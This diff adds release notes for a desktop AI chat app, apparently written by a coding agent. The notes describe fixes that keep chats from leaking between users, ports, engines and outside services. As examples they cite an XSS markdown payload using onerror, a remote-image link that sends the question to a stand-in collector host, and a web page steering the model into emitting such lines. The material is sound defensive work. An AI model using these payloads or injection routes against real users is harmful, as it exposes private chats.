@@ -5309,3 +5309,135 @@ written no longer turns an answered job into an error for the same job.
 
 NOTE: FLEET_HOME, Contribute's default hub, is ai.millertechnology.net —
 the web version switched off today. Contributors now have no hub.
+
+## 6b310 — nobody's chats reach another user
+Per Patrick: "The absolute most important thing is that we prevent
+people's questions, answers, and chats from mixing with other users."
+A design review for accounts and sync (on hold, not in this build) found
+four ways they already could, in today's app. All four are closed here,
+without waiting for accounts.
+
+- ANOTHER LOGIN'S APP COULD SERVE YOUR WINDOW. The server bound on a
+  background thread and the window opened 127.0.0.1:8889 whatever
+  happened. On a Mac with two logins both running ConcordeAI, the
+  second person's window loaded the FIRST person's app: their chats,
+  memory and keys. Now bind_backend binds before any window, a taken
+  8889 moves the desktop app to 8941-8949 (clear of the engines, 9889
+  and ConcordeGo's 9897), and a dev or test instance that named its
+  port fails instead of drifting. One desktop app per OS user
+  (run/instance.lock): a second copy on a fallback port would have
+  written the same chats.json. Windows binds with SO_EXCLUSIVEADDRUSE,
+  because its SO_REUSEADDR lets a second process bind a listening port.
+- ANYTHING ON THE COMPUTER COULD READ /api/chats. The web version's
+  door had been switched off (_gate returned True), and loopback is
+  shared by every account. Each launch now mints a key; the window
+  collects it once through /?key= as an HttpOnly, SameSite=Strict
+  cookie named for the port (browsers share cookies across the ports
+  of one host), and every request needs it plus a Host of this
+  server's own loopback name, which also stops DNS rebinding.
+  MILLENAI_KEY still pins it for dev and test instances; the gauntlet,
+  ci_smoke.sh, drill.py and CLAUDE.md send millen_key_<port>.
+- ANOTHER ACCOUNT'S ENGINE GOT YOUR PROMPTS. Anything listening on
+  11434 counted as Ollama, and anything on an MLX catalog port counted
+  as that engine. Two logins running ConcordeAI share those fixed
+  ports, so the second person's prompts, memory, name and attached files
+  went to the first person's engines. _listener_is_mine now wants the
+  listener's owner to be this user or a system account (root, Linux's
+  "ollama" service user: only the administrator controls those).
+  macOS: netstat -anv names every socket's pid and ps its uid, but
+  MEASURED, netstat shows no TCP sockets at all when a non-Apple
+  Python runs it (the app's venv included), so in practice it falls
+  back to lsof, which lists only the user's own processes: a root
+  Ollama reads as unknown and ours runs privately instead. Linux:
+  /proc/net/tcp's uid column. Windows: psutil, else netstat and
+  tasklist. Someone else's listener moves ours to a free port:
+  MODEL_ROUTES for MLX, OLLAMA_PORT plus OLLAMA_HOST for Ollama,
+  including the `ollama rm` fallback, which defaulted to 11434 too.
+  If ours can't start, ollama_url raises instead of sending.
+- POLLINATIONS IS GONE (per Patrick: remove it). With cloud power on and
+  no key, whole prompts went to text.pollinations.ai, memory and name
+  included. With no local image model and no Gemini key, image
+  descriptions went to image.pollinations.ai in the URL with no
+  opt-in, never with its private flag, onto a public feed. The Cloud
+  power pane said prompts leave "only while a key is on"; it now says
+  what is true, web searches included.
+- AN ANSWER COULD RUN SCRIPT IN THE PAGE. esc() escaped & < > but not
+  quotes, and renderMD builds <img alt="…"> and <a href="…"> from the
+  markdown, so ![x" onerror="…](https://…) closed the attribute and
+  ran code that could read every chat. A web page can talk a model
+  into writing exactly that line. esc() escapes both quotes now;
+  hilite leaves entities whole so a lone apostrophe's &#39; isn't
+  split by the number rule, and chat ids are escaped in the sidebar.
+  The gauntlet runs the page's own renderMD in node over an
+  attack corpus and fails on any on* attribute.
+- Each new check was mutation-tested: old esc, a trusted-any-listener
+  owner check, no fallback port, a Pollinations URL, and a hardcoded
+  11434 URL each fail it.
+- Also: the account droplet was rebooted onto its pending kernel
+  (7.0.0-34), approved by Patrick; the web version's leftovers
+  (users/ with 50 visitor profiles, google_oauth.json, owner_pin) went
+  to the Trash on his OK.
+
+### 6b310 review round: four reviewers, a skeptic per finding, 23 confirmed
+- THE KEY COOKIE WENT TO EVERY LOCAL PORT. Browsers scope a 127.0.0.1
+  cookie by host, not port, so one <img src="http://127.0.0.1:5555/">
+  (a web page's og:image, or a model's markdown) handed the launch key
+  to whatever listened there; confirmed in WKWebView and Chromium. The
+  page now carries a CSP of self + https only (PAGE_CSP), so any
+  plain-http load elsewhere is refused before it is sent (checked in
+  the browser pane and in a real hidden WKWebView). Photos and funnel
+  images are https-only on the server and in the page, and the gate
+  accepts ANY millen_key_<port> value, so a stray cookie with a longer
+  Path can't shadow the key.
+- ANSWERS NO LONGER LOAD REMOTE PICTURES. ![](https://collector/?q=…)
+  loaded with no click, so a web page could talk a model into sending
+  the question out. Markdown images render only from /api/image/; a
+  remote one becomes a link.
+- MODEL TEXT CAN'T OPEN A STREAM FRAME. The server's own frames (RESET,
+  RUN, DRAFT) are tagged Ctl(str); emit() strips NUL from everything
+  else, status() too, so an answer or a remote command's output can't
+  fake a MAP pin, SOURCES row, APPROVE card or a RESET.
+- ENGINE OWNERSHIP IS THREE-STATE. True, False, or None when the probe
+  failed; only a definite False moves an engine, None refuses the one
+  request (a slow lsof under memory pressure used to spawn a second
+  copy of a 17 GB model). One lsof lists all of this user's listeners
+  for a second (_my_listen_ports), since the status screens ask about
+  every model. run_model stops when the engine didn't start (its False
+  was ignored and the prompt went to whatever held the port), re-checks
+  ownership right before sending, and retires a stale engine instead of
+  just forgetting its handle. "Loaded" means loaded here (_engine_up).
+  Only this user's siblings keep engines alive at quit; moved engines
+  and a private Ollama always stop; the boot reaper takes this user's
+  mlx_lm orphans on any port and never the app itself. Windows compares
+  full DOMAIN\user names.
+- FALLBACK PORTS MOVED to 18890-18898: 8941-8949 held two engine ports
+  (8942, 8944), and the gauntlet now fails on any overlap with catalog
+  or retired ports.
+- A SECOND LAUNCH HANDS OFF instead of quitting silently: the running
+  copy writes run/instance.json (0600) once bound, and a second launch
+  asks /api/window/focus to bring the window forward (browser mode
+  reopens the tab WITH the key), exits at once, waits on the lock only
+  when the first copy doesn't answer (the swap after an update), and
+  says so in a native dialog if it runs out.
+- THE BROWSER-STORAGE CHAT COPY NEVER GOES BACK TO DISK: it resurrected
+  chats erased with Forget, and it is kept per port. Remote agent
+  autonomy lives in prefs too, so a moved app can't loosen it.
+- Smaller: mapCard takes numbers only; flow-diagram text isn't escaped
+  twice; the download fallback clicks a real download link (a
+  navigation made pywebview re-fetch without the cookie and save the
+  403); "in the cloud" shows only when a cloud painter exists; the
+  Cloud power copy says web search sends the question as typed.
+- CONTRIBUTE IS GONE (per Patrick: "we don't need a feature where
+  friends can answer each other's questions"). Three reviewers found it
+  still reachable: a worker pointed at an older hub ran other people's
+  questions, memory and names included. Worker, hub routes, fleet
+  state, the Community pane, the sidebar meter, the invite, the setup
+  checkbox and the friend's-GPU badge are all removed; the desktop app
+  scrubs contrib_*, fleet_auto and seen_share from prefs and deletes
+  fleet_key, fleet_workers.json and contrib_ledger.json at startup.
+  CAUGHT MYSELF: that scrub first ran from a TEST instance, which shares
+  the real data folder; it now runs only in the desktop app.
+- Found in passing, filed separately: the page references an undeclared
+  `perf` (the old perf mode), throwing every 1.5 s. It's on main too.
+- Gauntlet 233/233; ci_smoke.sh passes; an isolated end-to-end run
+  proved the fallback, the 0600 note and a 0-second handoff.
